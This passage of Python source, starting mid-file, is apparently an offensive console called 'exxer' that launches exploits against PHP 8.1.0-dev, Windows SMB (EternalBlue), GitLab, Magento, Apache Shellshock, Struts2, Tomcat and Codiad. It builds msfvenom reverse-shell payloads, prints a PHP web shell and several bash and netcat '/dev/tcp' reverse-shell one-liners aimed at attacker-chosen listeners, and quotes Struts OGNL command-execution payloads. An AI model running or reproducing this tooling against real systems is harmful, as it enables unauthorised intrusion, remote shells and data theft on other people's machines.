            sys.exit()
        if phpdev == "info":
            print("""
            # Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
            # Date: 23 may 2021
            # Exploit Author: flast101
            # Vendor Homepage: https://www.php.net/
            # Software Link:
            #     - https://hub.docker.com/r/phpdaily/php
            #    - https://github.com/phpdaily/php
            # Version: 8.1.0-dev
            # Tested on: Ubuntu 20.04
            # References:
            #    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
            #   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md
            """)
            phpdev = input("exploit/webapp/php/php-8.1.0-dev_remote_code_execution>")
        if phpdev == "edit":
            os.system("nano /usr/share/exxer/exploit/webapp/php/backdoor_php_8.1.0-dev.py")
            phpdev = input("exploit/webapp/php/php-8.1.0-dev_remote_code_execution>")
        if phpdev == "run" or phpdev == "send" or phpdev == "exploit":
            os.system("cd /usr/share/exxer/exploit/webapp/php/")
            os.system("python3 /usr/share/exxer/exploit/webapp/php/backdoor_php_8.1.0-dev.py")
            #new exploit son
        else:
            try:
                print("command not found")
            except:
                pass
            #son phpdev
    if mainmenu == "use exploit/windows/smb/windows_eternalblue_windows_8" or mainmenu == "use 3-exploit/windows/smb/windows_eternalblue_windows_8" or mainmenu == "use 3":
        print("loaded module => exploit/windows/smb/windows_eternalblue_windows_8")
        class win8:
            win8 = input("exploit/windows/smb/windows_eternalblue_windows_8>")
            if win8 == "help":
                win8help = """
                clear = clear screen
                send or run = run exploit module only exploitmenu and scanner menu  Doesn't work in web hacking and privesc and trojan menu
                quit or exit command = exit the tool
                info = info the exploit and scanner only exploit and scanner
                edit = edit the exploit and scanner only exploit and scanner
                coder = show the program authours
                """
                print(win8help)
                win8 = input("exploit/windows/smb/windows_eternalblue_windows_8>")
            if win8 == "clear":
                subprocess.call("clear")
                win8 = input("exploit/windows/smb/windows_eternalblue_windows_8>")
            if win8 == "quit" or win8 == "exit":
                try:
                    sys.exit()
                except:
                    pass
            if win8 == "info":
                try:
                    def info():
                        infowin8 = """
                        EternalBlue exploit for Windows 8 and 2012 by sleepya
                        The exploit might FAIL and CRASH a target system (depended on what is overwritten)
                        The exploit support only x64 target
                        Tested on:
                        - Windows 2012 R2 x64
                        - Windows 8.1 x64
                        - Windows 10 Pro Build 10240 x64
                        Default Windows 8 and later installation without additional service info:
                        - anonymous is not allowed to access any share (including IPC$)
                          - More info: https://support.microsoft.com/en-us/help/3034016/ipc-share-and-null-session-behavior-in-windows
                        - tcp port 445 is filtered by firewall
                        Reference:
                        - http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
                        - "Bypassing Windows 10 kernel ASLR (remote) by Stefan Le Berre" https://drive.google.com/file/d/0B3P18M-shbwrNWZTa181ZWRCclk/edit
                        Exploit info:
                        - If you do not know how exploit for Windows 7/2008 work. Please read my exploit for Windows 7/2008 at
                            https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a because the trick for exploit is almost the same
                        - The exploit use heap of HAL for placing fake struct (address 0xffffffffffd00e00) and shellcode (address 0xffffffffffd01000).
                            On Windows 8 and Wndows 2012, the NX bit is set on this memory page. Need to disable it before controlling RIP.
                        - The exploit is likely to crash a target when it failed
                        - The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
                        - If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
                        - See the code and comment for exploit detail.
                        Disable NX method:
                        - The idea is from "Bypassing Windows 10 kernel ASLR (remote) by Stefan Le Berre" (see link in reference)
                        - The exploit is also the same but we need to trigger bug twice
                        - First trigger, set MDL.MappedSystemVa to target pte address
                          - Write '\x00' to disable the NX flag
                        - Second trigger, do the same as Windows 7 exploit
                        - From my test, if exploit disable NX successfully, I always get code execution
                        """
                        print(infowin8)
                    info()
                except:
                    pass
                win8 = input("exploit/windows/smb/windows_eternalblue_windows_8>")
            if win8 == "coder":
                def coders():
                    coders = """
                    prisma = python developer
                    """
                    print(coders)
                    coders()
                    win8 = input("exploit/windows/smb/windows_eternalblue_windows_8>")
            if win8 == "edit":
                os.system("nano /usr/share/exxer/exploit/windows/win8/1-windows_eternalblue_exploit_windows_8")
                win8 = input("exploit/windows/smb/windows_eternalblue_windows_8>")
            if win8 == "send" or win8 == "run":
                win8tr = input("add target>")
                print("target => " + " " + win8tr)
                time.sleep(0.1)
                win8port = input("add listener port>")
                print("listener port =>" + " " + win8port)
                localhost = input("add listener ip>")
                print("listener port => " + " "  + localhost)
                time.sleep(0.5)
                print("shellcode is compiling")
                os.system("nasm -f bin /usr/share/exxer/windows/win8/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin")
                print("converting shelcode to payload")
                os.system("msfvenom -p windows/x64/shell_reverse_tcp LPORT=" + win8port + " " + "LHOST=" + localhost + " " + "--platform windows -a x64 --format raw -o sc_x64_payload.bin")
                time.sleep(0.5)
                print("Concentrate payload & shellcode:")
                os.system("cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin")
                print("starting the exploit please open the listener listener port => " + " " + win8port)
                time.sleep("0.10")
                os.system("python3 /usr/share/exxer/exploit/windows/win8/1-windows_eternalblue_exploit_windows_8" + " " + win8tr + " " + "sc_x64.bin")
            if win8 == "exit" or win8 == "quit":
                def exit():
                    try:
                        print("bye!")
                        sys.exit()
                    except:
                        pass
                exit()
            #son win8
    if mainmenu == "ls":
        os.system("ls")
        mainmenu = input("exxer>")
    if mainmenu == "use 4" or mainmenu == "use exploit/webapp/ruby/Gitlab_13.9.3_remote_code_execution":
        modulename = 'exploit/webapp/ruby/Gitlab_13.9.3_remote_code_execution'
        print("loaded module =>" +" " + modulename)
        class gitlab:
            modulename = 'exploit/webapp/ruby/Gitlab_13.9.3_remote_code_execution'
            gitlab = input(modulename + ">")
            if gitlab == "clear":
                subprocess.call("clear")
                gitlab = input(modulename + ">")
            if gitlab == "help" or gitlab == "HELP":
                print("""
                run or send = send the exploit module
                edb = Is it an approved exploit learn command?
                help = show the help menu
                info = show the exploit info
                edit = edit the exploit
                """)
            if gitlab == "edb":
                print("verifired for edb")
                gitlab = input(modulename + ">")
            if gitlab == "run" or gitlab == "send" or gitlab == "exploit":
                gitarget = input("add target url>")
                print("target =>" +" " + gitarget)
                time.sleep(0.2)
                gitport = input("add target port>")
                print("target port =>" +" " + gitport)
                gitusername = input("add target username>")
                print("username =>" + " " + gitusername)
                gitpassword = input("add target password>")
                print("password => " +" " + gitpassword)
                gitlisten = input("add listener ip>")
                print("listener ip =>" +" " + gitlisten)
                gitlistenp = input("add listener port>")
                print("listener port =>" +" " + gitlistenp)
                print("starting the exploit please open the listener listener port and ip is =>" +" " + gitlisten +" " + gitlistenp)
                os.system("python3 /usr/share/exxer/exploit/webapp/ruby/4-gitlab_remote_code_execution -U" + " " + gitusername + " " + "-p" + " " + gitpassword + " " + "-t" + " " + gitarget + " " + "-c" + "sh -i >& /dev/tcp/" + gitlisten + " " + "/" + gitlistenp + " " + "0>&1")
                #sonexploit
            if gitlab == "info":
                print("""
                # Exploit Title: Gitlab 13.9.3 - Remote Code Execution (Authenticated)
                # Date: 02/06/2021
                # Exploit Author: enox
                # Vendor Homepage: https://about.gitlab.com/
                # Software Link: https://gitlab.com/
                # Version: < 13.9.4
                # Tested On: Ubuntu 20.04
                # Environment: Gitlab 13.9.1 CE
                # Credits: https://hackerone.com/reports/1125425
                """)
                gitlab = input(modulename + ">")
            if gitlab == "edit":
                os.system("nano /usr/share/exxer/exploit/webapp/ruby/4-gitlab_remote_code_execution")
                gitlab = input(modulename + ">")
            if gitlab == "exit" or gitlab == "quit":
                try:
                    class exit:
                        sys.exit()
                except:
                    pass
    if mainmenu == "shell generate":
        load = 'shellter'
        def __init__(self):
            load = 'shellter>'
            menu = """
            1-php
            2-bash
            3-nc
            """
            print(menu)
            shell = input(load)
            if shell == "1" or shell == "php":
                subprocess.call("clear")
                php = 'php>'
                phpm = """
                1-php cmd
                99-exit
                """
                print(phpm)
                php = input(php)
                if php == "1":
                    module = 'php/cmd'
                    print("loaded module =>" + " " + module)
                    print("generating shell")
                    cmd = """
                    <html>
                    <body>
                    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                    <input type="TEXT" name="cmd" id="cmd" size="80">
                    <input type="SUBMIT" value="Execute">
                    </form>
                    <pre>
                    <?php
                        if(isset($_GET['cmd']))
                        {
                            system($_GET['cmd']);
                        }
                    ?>
                    </pre>
                    </body>
                    <script>document.getElementById("cmd").focus();</script>
                    </html>
                    """
                    print(cmd)
                    print("shell generated")
            if shell == "2" or shell == "bash":
                modulese = 'bash'
                print("loaded module =>" +" " + modulese)
                bashmenu = """
                1-bash -i
                2-bash 196
                3-bash readline
                4-bash 5
                6-exit
                """
                print(bashmenu)
                bash = input(modulese + ">")
                if bash == "1":
                    bashmodule = 'bash/-i'
                    print("loaded module =>" +" " + bashmodule)
                    baship = input("add listener ip>")
                    print("listener ip =>" + " " + baship)
                    bashport = input("add listener port>")
                    print("listener port =>" +" " + bashport)
                    print("generating shell")
                    print("sh -i 5<> /dev/tcp/" + baship +"/" + bashport +" " + "0<&5 1>&5 2>&5")
                    print("generated shell")
                if bash == "2":
                    bashmodules = '>bash 196<'
                    print("loaded module =>" + " " + bashmodules)
                    yuzdoksanaltıip = input("add listener ip>")
                    print("listener ip =>" + " " + yuzdoksanaltıip)
                    bashport1 = input("add listener port>")
                    print("listener port =>" +" " + bashport)
                    print("generating shell")
                    print("0<&196;exec 196<>/dev/tcp/" + yuzdoksanaltıip + "/" + bashport1 + " " + "; sh <&196 >&196 2>&196")
                if bash == "3":
                    lodedmodules = 'bash/readline'
                    print("loaded module =>" +" " + lodedmodules)
                    readip = input("add listener ip>")
                    print("listener ip =>" + " " + readip)
                    readport = input("add listener port>")
                    print("lsitener port =>" +" " + readport)
                    print("generatign shell")
                    print("exec 5<>/dev/tcp/" + readip + "/" + readport + ";" + "cat <&5 | while read line; do $line 2>&5 >&5; done")
                    print("shell generated")
                if bash == "4":
                    print("loaded module => bash/5")
                    besip = input("add listener ip>")
                    print("listener ip =>" +" " + besip)
                    besport = input("add listener port>")
                    print("listner port =>" +" " + besport)
                    print("generating shell")
                    print("sh -i 5<> /dev/tcp/" + besip + "/" + besport + " " + "0<&5 1>&5 2>&5")
                #son bash
                if bash == "exit" or bash == "quit" or bash == "6":
                    sys.exit()
                if shell == "nc" or shell == "3":
                    print("loaded module => nc")
                    print("""
                    [1]-nc -e
                    [2]-nc -c
                    """)
                    nc = input("nc>")
                    if nc == "1":
                        ncip = input("add listener ip>")
                        print("listener ip =>" + " " + ncip)
                        ncport = input("add listener port>")
                        print("listener port =>" + ncport)
                        print("generating shell")
                        print("nc -e sh" + " " + ncip + " " + ncport)
                    if nc == "2":
                        print("loaded module => nc/c")
                        ncc = input("add listener ip>")
                        print("listener ip =>" + " " + ncc)
                        ncp = input("add listener port>")
                        print("listener port =>" +" " + ncp)
                        print("generating menu")
                        time.sleep(0.5)
                        print("nc -c sh" + ncc + " " + ncp)
                        #son netcat
        __init__(self)
    if mainmenu == "use 5" or mainmenu == "use exploit/webapp/cms/magento_Unauthenticated_sql_injection" or mainmenu == "use 5-exploit/webapp/cms/magento_Unauthenticated_sql_injection":
        print("loaded module => exploit/webapp/cms/magento_Unauthenticated_sql_injection")
        magentosqli = input("magento>")
        if magentosqli == "back":
            os.system("exxer")
        if magentosqli == "help":
            print(helpmenu)
        if magentosqli == "exploit" or magentosqli == "send" or magentosqli == "run":
            magentotarget = input("add target>")
            print("target is => " + " " + magentotarget)
            os.system("python3 /usr/share/exxer/exploit/webapp/cms/magento-sqli.py" +  " " + magentotarget)
        if magentosqli == "back":
            os.system("exxer")
        if magentosqli == "exit":
            sys.exit()
        if magentosqli == "quit":
            sys.exit()
        if magentosqli == "clear":
            subprocess.call("clear")
            magentosqli = input("magento>")
        if magentosqli == "info":
            maginfo = """
            #
            # SOURCE & SINK
            # The sink (from-to SQL condition) has been present from Magento 1.x onwards.
            # The source (/catalog/product_frontend_action/synchronize) from 2.2.0.
            # If your target runs Magento < 2.2.0, you need to find another source.
            #
            # SQL INJECTION
            # The exploit can easily be modified to obtain other stuff from the DB, for
            # instance admin/user password hashes.
            #
            """
            print(maginfo)
            magentosqli = input("magento>")
        if magentosqli == "edit":
            os.system("nano /usr/share/exxer/exploit/webapp/cms/magento-sqli.py")
            magentosqli = input("magento>")
        else:
            os.system("python3 /usr/share/exxer/exploit/webapp/cms/magentoelse.py")
    if mainmenu == "use 6-exploit/webapp/Shellshock" or mainmenu == "use exploit/webapp/Shellshock" or mainmenu == "use 6":
        print("loaded module => -exploit/webapp/Shellshock")
        apache = input("shellshock>")
        if apache == "back":
            os.system("exxer")
        if apache == "info":
            print("""
            Apache mod_cgi - 'Shellshock' Remote Command Injection 
            """)
            apache = input("shellshock>")
        if apache == "edit":
            os.system("nano /usr/share/exxer/exploit/webapp/apache/shellshock.py")
            apache = input("shellshock>")
        if apache == "help":
            print("""
            clear = clear screen
            send or run = run exploit module only exploitmenu and scanner menu  Doesn't work in web hacking and privesc and trojan menu
            quit or exit command = exit the tool
            info = info the exploit and scanner only exploit and scanner
            edit = edit the exploit and scanner only exploit and scanner
            """)
            apache = input("shellshock>")
        if apache == "send" or apache == "exploit" or apache == "run":
            shellshockip = input("add target host>")
            print("target host is => " + " " + shellshockip)
            print("starting super cow powers")
            time.sleep(0.5)
            os.system("python3 /usr/share/exxer/exploit/webapp/apache/shellshock.py" +" " + shellshockip)
        if apache == "edit":
            os.system("nano /usr/share/exxer/exploit/webapp/apache/shellshock.py")
            apache = input("shellshock>")
        if apache == "exit" or apache == "quit":
            sys.exit()
        if apache == "clear":
            subprocess.call("clear")
        else:
            os.system("python3 /usr/share/exxer/exploit/webapp/apache/shellshockelse.py")
    if mainmenu == "use 7-exploit/webapp/Apache_Struts_2_CVE-2013-2251" or mainmenu == "use exploit/webapp/Apache_Struts_2_CVE-2013-2251" or mainmenu == "use 7":
        print("loaded module => exploit/webapp/Apache_Struts_2_CVE-2013-2251")
        strı = input("Struts>")
        if strı == "help":
            print("""
            show exploit = show the all exploits
            clear = clear screen
            send or run = run exploit module only exploitmenu and scanner menu  Doesn't work in web hacking and privesc and trojan menu
            quit or exit command = exit the tool
            info = info the exploit and scanner only exploit and scanner
            edit = edit the exploit and scanner only exploit and scanner
            """)
            strı = input("struts>")
        if strı == "clear":
            subprocess.call("clear")
            strı = input("struts>")
        if strı == "info":
            print("""
            CVE Number:         CVE-2013-2251
            Title:              Struts2 Prefixed Parameters OGNL Injection Vulnerability
            Affected Software:  Apache Struts v2.0.0 - 2.3.15
            Credit:             Takeshi Terada of Mitsui Bussan Secure Directions, Inc.
            Issue Status:       v2.3.15.1 was released which fixes this vulnerability
            Issue ID by Vender: S2-016

            Overview:
            Struts2 is an open-source web application framework for Java.
            Struts2 (v2.0.0 - 2.3.15) is vulnerable to remote OGNL injection which
            leads to arbitrary Java method execution on the target server. This is
            caused by insecure handling of prefixed special parameters (action:,
            redirect: and redirectAction:) in DefaultActionMapper class of Struts2.

            Details:
            <About DefaultActionMapper>

            Struts2's ActionMapper is a mechanism for mapping between incoming HTTP
            request and action to be executed on the server. DefaultActionMapper is
            a default implementation of ActionMapper. It handles four types of
            prefixed parameters: action:, redirect:, redirectAction: and method:.

            For example, redirect prefix is used for HTTP redirect.

            Normal redirect prefix usage in JSP:
                <s:form action="foo">
                ...
                <s:submit value="Register"/>
                <s:submit name="redirect:http://www.google.com/" value="Cancel"/>
                </s:form>

            If the cancel button is clicked, redirection is performed.

            Request URI for redirection:
                /foo.action?redirect:http://www.google.com/

            Resopnse Header:
                HTTP/1.1 302 Found
                Location: http://www.google.com/

            Usage of other prefixed parameters is similar to redirect.
            See Struts2 document for details.
            https://cwiki.apache.org/confluence/display/WW/ActionMapper

            <How the Attack Works>

            As stated already, there are four types of prefixed parameters.

                action:, redirect:, redirectAction:, method:

            All except for method: can be used for attacks. But regarding action:,
            it can be used only if wildcard mapping is enabled in configuration.
            On the one hand, redirect: and redirectAction: are not constrained by
            configuration (thus they are convenient for attackers).

            One thing that should be noted is that prefixed parameters are quite
            forceful. It means that behavior of application which is not intended
            to accept prefixed parameters can also be overwritten by prefixed
            parameters added to HTTP request. Therefore all Struts2 applications
            that use DefaultActionMapper are vulnerable to the attack.

            The injection point is name of prefixed parameters.
            Example of attack using redirect: is shown below.

            Attack URI:
                /bar.action?redirect:http://www.google.com/%25{1000-1}

            Response Header:
                HTTP/1.1 302 Found
                Location: http://www.google.com/999

            As you can see, expression (1000-1) is evaluated and the result (999)
            is appeared in Location response header. As I shall explain later,
            more complex attacks such as OS command execution is possible too.

            In DefaultActionMapper, name of prefixed parameter is once stored as
            ActionMapping object and is later executed as OGNL expression.
            Rough method call flow in execution phase is as the following.

            org.apache.struts2.dispatcher.ng.filter.StrutsExecuteFilter.doFilter()
            org.apache.struts2.dispatcher.ng.ExecuteOperations.executeAction()
            org.apache.struts2.dispatcher.Dispatcher.serviceAction()
            org.apache.struts2.dispatcher.StrutsResultSupport.execute()
            org.apache.struts2.dispatcher.StrutsResultSupport.conditionalParse()
            com.opensymphony.xwork2.util.TextParseUtil.translateVariables()
            com.opensymphony.xwork2.util.OgnlTextParser.evaluate()

            Proof of Concept:
            <PoC URLs>

            PoC is already disclosed on vender's web page.
            https://struts.apache.org/release/2.3.x/docs/s2-016.html

            Below PoC URLs are just quotes from the vender's page.

            Simple Expression:
                http://host/struts2-blank/example/X.action?action:%25{3*4}
                http://host/struts2-showcase/employee/save.action?redirect:%25{3*4}

            OS Command Execution:
                http://host/struts2-blank/example/X.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}
                http://host/struts2-showcase/employee/save.action?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}
                http://host/struts2-showcase/employee/save.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'command','goes','here'})).start()}

            Obviously such attacks are not specific to blank/showcase application,
            but all Struts2 based applications may be subject to attacks.

            <OS Command Execution and Static Method Call>

            Another topic that I think worth mentioning is that PoC URLs use
            ProcessBuilder class to execute OS commands. The merit of using this
            class is that it does not require static method to execute OS commands,
            while Runtime class does require it.

            As you may know, static method call in OGNL is basically prohibited.
            But in Struts2 <= v2.3.14.1 this restriction was easily bypassed by
            a simple trick:

            %{#_memberAccess['allowStaticMethodAccess']=true,
                @java.lang.Runtime@getRuntime().exec('your commands')}

            In Struts v2.3.14.2, SecurityMemberAccess class has been changed to
            prevent the trick. However there are still some techniques to call
            static method in OGNL.

            One technique is to use reflection to replace static method call to
            instance method call. Another technique is to overwrite #_memberAccess
            object itself rather than property of the object:

            %{#_memberAccess=new com.opensymphony.xwork2.ognl.SecurityMemberAccess(true),
                @java.lang.Runtime@getRuntime().exec('your commands')}

            Probably prevention against static method is just an additional layer
            of defense, but I think that global objects such as #_memberAccess
            should be protected from rogue update.

            Timeline:
            2013/06/24  Reported to Struts Security ML
            2013/07/17  Vender announced v2.3.15.1
            2013/08/10  Disclosure of this advisory

            Recommendation:
            Immediate upgrade to the latest version is strongly recommended as
            active attacks have already been observed. It should be noted that
            redirect: and redirectAction: parameters were completely dropped and
            do not work in the latest version as stated in the vender's page.
            Thus attention for compatibility issues is required for upgrade.

            If you cannot upgrade your Struts2 immediately, filtering (by custom
            servlet filter, IPS, WAF and so on) can be a mitigation solution for
            this vulnerability. Some points about filtering solution are listed
            below.

            - Both %{expr} and ${expr} notation can be used for attacks.
            - Parameters both in querystring and in request body can be used.
            - redirect: and redirectAction: can be used not only for Java method
                execution but also for open redirect.

            See S2-017 (CVE-2013-2248) for open redirect issue.
            https://struts.apache.org/release/2.3.x/docs/s2-017.html

            Reference:
            https://struts.apache.org/release/2.3.x/docs/s2-016.html
            https://cwiki.apache.org/confluence/display/WW/ActionMapper
            """)
            strı = input("struts>")
        if strı == "edit":
            os.system("nano /usr/share/exxer/exploit/webapp/apache/Apache_Struts_2_CVE-2013-2251.py")
            strı = input("struts>")
        if strı == "send" or strı == "run" or strı == "exploit":
            print("starting exploit")
            targetapachestru = input("add target host>")
            print("target host is => " + " " + targetapachestru)
            os.system("python3 /usr/share/exxer/exploit/webapp/apache/Apache_Struts_2_CVE-2013-2251.py" + " " + targetapachestru)
        if strı == "exit" or strı == "quit":
            sys.exit()
        if strı == "back":
            os.system("exxer")
        else:
            os.system("python3 /usr/share/exxer/exploit/webapp/apache/Apache_Struts_2_CVE-2013-2251else.py")
    if mainmenu == "use 8-exploit/webapp/apache_tomcat_exploit" or mainmenu == "use 8" or mainmenu == "use exploit/webapp/apache_tomcat_exploit":
        print("loaded module => exploit/webapp/apache_tomcat_exploit")
        tomcat = input("tomcat>")
        if tomcat == "help":
            print("""
            clear = clear screen
            send or run = run exploit module only exploitmenu and scanner menu  Doesn't work in web hacking and privesc and trojan menu
            quit or exit command = exit the tool
            info = info the exploit and scanner only exploit and scanner
            edit = edit the exploit and scanner only exploit and scanner
            """)
            tomcat = input("tomcat>")
        if tomcat == "clear":
            subprocess.call("clear")
            tomcat = input("tomcat>")
        if tomcat == "info":
            print("""
            Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution
            jsp upload bypass
            """)
            tomcat = input("tomcat>")
        if tomcat == "edit":
            os.system("nano /usr/share/exxer/exploit/webapp/apache/tomcatexploit.py")
            tomcat = input("tomcat>")
        if tomcat == "send" or tomcat == "run" or tomcat == "exploit":
            print("starting the exploit")
            tomcattarget = input("add target host>")
            print("target host => " + " " + tomcattarget)
            os.system("python3 /usr/share/exxer/exploit/webapp/apache/tomcatexploit.py --url " + " " + tomcattarget)
        if tomcat == "exit" or tomcat == "quit":
            try:
                pass
            except:
                pass
            sys.exit()
        else:
            print("ınvalıd command")
            os.system("python3 /usr/share/exxer/exploit/webapp/apache/tomcatexploitelse.py")
    if mainmenu == "use 9-exploit/webapp/cms/codiac_remote_code_execution" or mainmenu == "use 9" or mainmenu == "use exploit/webapp/cms/codiac_remote_code_execution":
        print("loaded module => exploit/webapp/cms/codiac_remote_code_execution")
        codiac = input("codiac>")
        if codiac == "help":
            print("""
            clear = clear screen
            send or run = run exploit module only exploitmenu and scanner menu  Doesn't work in web hacking and privesc and trojan menu
            quit or exit command = exit the tool
            info = info the exploit and scanner only exploit and scanner
            edit = edit the exploit and scanner only exploit and scanner
            """)
        codiac = input("codiac>")
        if codiac == "clear":
            os.system("clear")
            codiac = input("codiac>")
        if codiac == "info":
            print("""
            A simple exploit to execute system command on Codiad This tool will exploit the vuln Codiad application to get a reverse shell
            CVE

                CVE-2017-11366
                CVE-2017-15689
                CVE-2018-14009 (0 Day exploitation)

            Effected Version

            <=2.8.4 (latest version)

            Effected Environment

            Windows
            Linux
            """)
            codiac = input("codiac>")
        if codiac == "edit":
            os.system("nano /usr/share/exxer/exploit/webapp/cms/codiacexploit.py")
            codiac = input("codiac>")
        if codiac == "send" or codiac == "exploit" or codiac == "run":
            codiactarget = input("add target host>")
            print("target hostname => " + " " + codiactarget)
            codiacusername = input("add username>")
            print("target username =>" + " " + codiacusername)
            codiacpasswd = input("add password>")
            print("target password => " +" " + codiacpasswd)
            codiaclhost = input("add listener ip>")
            print("listener ip => " + " " + codiaclhost)
            codiacport = input("add listener port>")
            print("listener port => " +" " + codiacport)
            print("starting the the exploit please open the listeners")
            os.system("python2 /usr/share/exxer/exploit/webapp/cms/codiacexploit.py" + " " + codiactarget + " " + codiacusername +" " + codiacpasswd + " " + codiaclhost + " " + codiacport + " " + "linux")
        else:
            print("command not found")
            codiac = input("codiac>")
    else:
        print("command not found")
        os.system("exxer")
if __name__ == '__main__':
    exxer()
#bitti